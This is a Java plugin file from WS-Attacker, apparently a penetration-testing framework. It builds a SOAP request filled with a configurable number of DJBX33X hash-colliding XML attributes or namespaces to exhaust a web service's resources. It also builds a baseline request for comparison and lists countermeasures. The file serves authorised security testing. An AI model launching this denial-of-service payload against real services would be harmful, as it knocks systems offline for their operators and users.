/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;

import java.util.HashMap;
import java.util.Map;

import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.main.plugin.option.OptionSimpleBoolean;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;
import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX33X;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;
import wsattacker.plugin.dos.dosExtension.util.UtilHashDoS;

public class HashCollisionDJBX33X
    extends AbstractDosPlugin
{

    // Mandatory DOS-specific Attributes - Do NOT change!
    // <editor-fold defaultstate="collapsed" desc="Autogenerated Attributes">
    private static final long serialVersionUID = 1L;

    // </editor-fold>
    // Custom Attributes
    private AbstractOptionInteger optionNumberAttributes;

    private OptionSimpleBoolean optionUseNamespaces;

    @Override
    public void initializeDosPlugin()
    {
        initData();
        // Custom Initilisation
        optionNumberAttributes =
            new OptionLimitedInteger( "Number of colliding attributes", 10000,
                                      "The number of colliding attributes placed within the message", 0, 99999999 );
        optionUseNamespaces =
            new OptionSimpleBoolean( "Use namespaces?", false,
                                     "checked = collisions in namespaces, unchecked = collisions in attributes" );
        getPluginOptions().add( optionNumberAttributes );
        getPluginOptions().add( optionUseNamespaces );

    }

    public AbstractOptionInteger getOptionNumberAttributes()
    {
        return optionNumberAttributes;
    }

    @Override
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition()
    {
        return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENTATTRIBUTES;
    }

    public void initData()
    {
        setName( "DJBX33X Hash Collision Attack" );
        setDescription( "This attack checks wheter or not a Web service is vulnerable to a \n"
            + "Hash Collision Attack for a DJBX33X hash algorithm."
            + "The attack exhausts the resources of the server by constantly creating collisions \n"
            + "in the hash map algorithm that is used to process the XML document.\n"
            + "The original advisory can be found here: http://www.nruns.com/_downloads/advisory28122011.pdf \n\n"
            + "The attack algorithm replaces the string $$PAYLOADATTR$$ in the SOAP message below \n"
            + "with the defined number of colliding attributes or XML namespaces.\n"
            + "The placeholder $$PAYLOADATTR$$ can be set to any other position in the SOAP message" + "\n\n" );
        setCountermeasures( "In order to fix the root of the problem the implementation of the "
            + "hash mapping algorithm has to be made cryptographically stronger.\n"
            + "However this is usually beyond the scope of the tester."
            + "It is recommended to check if a fix for the current version of the underlying programming language is available."
            + "If a fix is provided, update to the latest version to fix the issue."
            + "If no fix is provided, limit the number of attributes that an XML element can hold." );
    }

    @Override
    public void createTamperedRequest()
    {

        // create payload string for selected hash algorithms
        StringBuilder sb = new StringBuilder( "" );

        // DJBX33X - n viele Kollisionen erzeugen
        CollisionDJBX33X DJBX33X = new CollisionDJBX33X();
        DJBX33X.genNCollisions( optionNumberAttributes.getValue(), sb, optionUseNamespaces.isOn() );

        // replace "Payload-Attribute" with Payload-String
        // -> is a lot more efficient, then adding each Attribute sequentially
        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
        String soapMessageFinal =
            this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload( soapMessage, sb.toString() );

        // get HeaderFields from original request, if required add custom
        // headers - make sure to clone!
        Map<String, String> httpHeaderMap = new HashMap<String, String>();
        for ( Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet() )
        {
            httpHeaderMap.put( entry.getKey(), entry.getValue() );
        }

        // write payload and header to TamperedRequestObject
        this.setTamperedRequestObject( httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal );

    }

    /**
     * custom untampered request needed for prevention of false positives based on effect of XML Attribute Count Attack
     */
    @Override
    public void createUntamperedRequest()
    {

        CollisionDJBX33X DJBX33X = new CollisionDJBX33X();
        String untampered =
            UtilHashDoS.generateUntampered( DJBX33X, optionNumberAttributes.getValue(), optionUseNamespaces.isOn() );

        // get SOAP message from option field + replace with payload
        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
        String soapMessageFinal =
            this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload( soapMessage, untampered );

        // get HeaderFields from original request, if required add custom
        // headers - make sure to clone!
        Map<String, String> httpHeaderMap = new HashMap<String, String>();
        for ( Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet() )
        {
            httpHeaderMap.put( entry.getKey(), entry.getValue() );
        }

        // write payload and header to TamperedRequestObject
        this.setUntamperedRequestObject( httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal );
    }

    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below!
    // ----------------------------------------------------------
}
